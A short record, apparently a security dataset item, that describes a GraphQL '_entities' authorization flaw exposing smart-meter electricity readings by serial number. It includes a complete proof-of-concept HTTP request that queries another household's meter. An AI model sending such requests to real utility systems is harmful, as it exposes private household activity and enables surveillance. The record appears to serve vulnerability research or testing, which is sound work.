diagnosis: The SmartMeter subgraph resolver reads power utility meter consumption metrics by serialNumber without checking if the calling utility customer account owns the physical meter. An attacker can scan serial numbers to monitor real-time household electricity usage patterns.
exploit_request:
POST /graphql HTTP/1.1
Host: smartgrid.utility.io
Authorization: Bearer <customer_token>
Content-Type: application/json

{"query": "query { _entities(representations: [{ __typename: \"SmartMeter\", serialNumber: \"MTR-RES-88210-NJ\" }]) { ... on SmartMeter { currentKwhReading lastReportedAt } } }"}
